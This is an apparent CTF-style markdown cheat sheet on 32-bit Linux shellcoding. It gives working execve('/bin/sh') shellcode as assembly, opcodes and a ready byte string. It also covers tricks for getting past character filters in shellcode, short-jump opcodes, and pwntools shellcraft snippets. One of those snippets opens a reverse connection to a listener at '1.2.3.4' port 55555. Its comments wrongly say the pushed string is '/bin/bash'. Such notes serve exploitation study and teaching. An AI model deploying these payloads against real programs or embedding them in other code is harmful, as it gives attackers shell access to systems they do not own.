# basic 32 bit shell code

## EXECVE
```
execve("/bin/sh", 0,  0    )   
         ebx     ecx  edx     eax=0xb
```

## 32 bit shellcode

```

assmebly code       what it does                                    assmebly's opcode

xor     eax,eax                                                         31 c0
push    eax         // push \x00 to stack                               50    
push    0x68732f2f  // pushing /bin/bash\x00                            68 2f 2f 73 68  
push    0x6e69622f                                                      68 2f 62 69 6e
mov     ebx, esp    // now ebx=esp, i.e is /bin/bash\x00                89 e3
push    eax                                                             50
push    ebx                                                             53
mov     ecx, esp   // now ecx = ["/bin/sh","\x00"]                      89 e1
mov     al, 0xb                                                         b0 0b   
int     0x80                                                            cd 80
```

> Note:  value of ecx can be null i.e \x00 in execve

gives 
```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
```

* Now we can play with it like using `mov eax,0xffffffff , inc eax` to make eax 0 if `xor eax,eax` not there.




# Good tricks


## Jummp to a label if condition not true


```
asm(
    "cmp eax,0x100\n" +
    "jnz jumpHere\n"  +
    shellcraft.pushstr('/bin/bash') +
    "mov ebx, esp\n" + 
    shellcraft.pushstr_array('ecx', ['/bin/bash', '-c', 'ls']) + 
    "xor edx, edx\n" + 
    "int 0x80\n" +
    "jumpHere:\n" +
    "nop"
)
```

## Cannot have upper case A-Z in shellcode

well its ez , suppose we have a shellcode
```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
```

make a simple py script to find un-wanted characters:
```
def checker(s):
    for i in s:
        if ord('A') <= ord(i) <= ord('Z'):
            print("not working by : {} i.e 0x{:2x}".format(i,ord(i)))



d="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
checker(d)
```

this tells `\x50` this is `push eax` and `\x53` this is `push ebx` are the once we cant have.<br />
so replace `push eax` with `sub esp,0x4; mov [esp],eax;` <br/>
thus we can find way to bypass any such restriction just think Out of B.


## Jump to current addr + n


* The 2 byte Opcode `\x04\xeb` is used to jump at `current_addr + 4` .

> similarly \x09\xeb is for 9 bytes and so on, until \xff


# ShellCraft : shellcoding

USE 
* shellcraft.i386 for 32 bit binary
* shellcraft.amd64 for 64 bit binary
* shellcraft.arm for arm
* shellcraft.mips for mips

refer : http://docs.pwntools.com/en/stable/shellcraft.html


## making a reverse connection

we ran a nc -l -p 55555 on a server, `edx contains the socket descriptor`

```
shellcraft.i386.linux.connect("1.2.3.4", 55555)
```

## push, pushstr and pushstr_array

### push
push a int val to stack
```
asm(
    shellcraft.i386.push(0)

)
```

### pushstr

Push a string onto stack
```
asm(
    shellcraft.pushstr('/bin/bash') +
    "mov eax,esp\n"
) 
```

### pushstr_array

Pushes an array/envp‐style array of pointers onto the stack.
```
shellcraft.pushstr_array('ecx', ['/bin/bash', '-c', 'ls'])
```


## Complete list of function

* [shellcode detailed](./docx/32bit-shellcode.pdf)
